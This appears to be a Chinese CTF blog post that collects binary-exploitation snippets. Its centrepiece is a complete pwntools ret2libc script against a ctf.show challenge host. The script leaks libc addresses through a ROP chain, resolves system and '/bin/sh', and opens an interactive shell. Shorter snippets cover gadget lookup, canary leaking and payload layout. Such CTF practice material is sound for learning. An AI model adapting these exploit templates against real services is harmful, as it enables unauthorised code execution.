---
title: "pwn公式脚本小搜集"
image: ''
pinned: false
comment: true
published: 2026-03-21
updated: 2026-04-16
description: "pwn"
category: PWN
tags: [PWN]
---

# 一.通过libcsearch确认libc版本

```
from pwn import *
from LibcSearcher import LibcSearcher

context(os='linux', arch='amd64', log_level='debug')

# 替换为你的题目地址
sh = remote('pwn.challenge.ctf.show', 28202)
elf = ELF('./pwn')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
offset = 0x78

def get_addr(func_name):
    payload = b'a' * offset
    payload += p64(pop_rdi)
    payload += p64(elf.got[func_name])
    payload += p64(puts_plt)
    payload += p64(main_addr)
    
    sh.sendlineafter(b'!', payload)
    
    # 关键点：puts 输出的是二进制流，末尾带 \n
    # 我们只接收前 6 字节，因为 64 位地址高位通常是 00
    addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    return addr

# 1. 泄露多个地址以增加匹配精度
puts_addr = get_addr('puts')
log.success(f'Puts real addr: {hex(puts_addr)}')

# 此时程序回到了 main，再次触发泄露
libc_start_main = get_addr('__libc_start_main')
log.success(f'Libc_start_main real addr: {hex(libc_start_main)}')

# 2. 使用 LibcSearcher 进行匹配
# 传入多个条件可以极大地缩小范围
libc = LibcSearcher('puts', puts_addr)
libc.add_condition('__libc_start_main', libc_start_main)

# 如果匹配到多个，它会提示你选；如果没匹配到，会报错
try:
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
    
    log.success(f'Libc Base: {hex(libc_base)}')
    log.success(f'System: {hex(system_addr)}')
    
    # 3. 最终 Payload (注意 64 位 system 栈对齐)
    ret = rop.find_gadget(['ret'])[0]
    payload = b'a' * offset
    payload += p64(ret) # stack alignment
    payload += p64(pop_rdi)
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    
    sh.sendlineafter(b'!', payload)
    sh.interactive()

except Exception as e:
    print(f"[-] Libc matching failed: {e}")
    print("请检查泄露地址是否正确，或者尝试更新 LibcSearcher 数据库")
```

## 注意：

此脚本为偶遇一题通过泄露函数确定libc版本的题目，后续攻击均需我们自己指定文件，脚本为ai根据我的wp跑成，关键在于确定libc版本的那几段，所以仅用来参考，不要照抄。



# 二.ROP常用代码

```
rop=ROP('./XXX')
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
```

```
payload = b'A' * offset 
payload += p64(ret)      #栈对齐使用
payload += p64(pop_rdi) 
payload += p64(bin_sh) 
payload += p64(system_plt)
64位二点简单rop使用ret2text
```

```
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr  = libc_base + libc.dump('str_bin_sh')
```













# 三.读取地址代码

```
canary = u64(canary_raw.rjust(8, b'\x00')) 
```

```
p.sendline(payload1)
p.recvuntil(payload1)
leaked_canary = u64(p.recv(8).ljust(8, b'\x00')) - 0xa #sendline发送数据末尾有换行0xa
```







# 四.环境配置代码

```
context(os='linux', arch='amd64', log_level='debug')
```











# 五.自定义发送函数describe_payload

```
def describe_payload(name, parts):
    """
    打印 payload 分段布局，便于核对偏移。
    parts: [(字段名, bytes), ...]
    """
    off = 0
    log.info('%s layout:' % name)
    for field, chunk in parts:
        end = off + len(chunk) - 1
        log.info('  [0x%02x..0x%02x] len=%-2d %-18s %r' % (off, end, len(chunk), field, chunk))
        off += len(chunk)
    log.info('  total length = 0x%x (%d)' % (off, off))
```

### 使用方法：

```
payload_leak_parts = [

  ('pad', leak_pad),

  ('saved_ebp', leak_saved_ebp),

  ('ret=puts@plt', leak_ret),

  ('next=main', leak_next),

  ('arg=puts@got', leak_arg),

  ('newline', leak_nl),

]

payload_leak = b''.join(chunk for _, chunk in payload_leak_parts)

describe_payload('payload_leak', payload_leak_parts)
```





---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
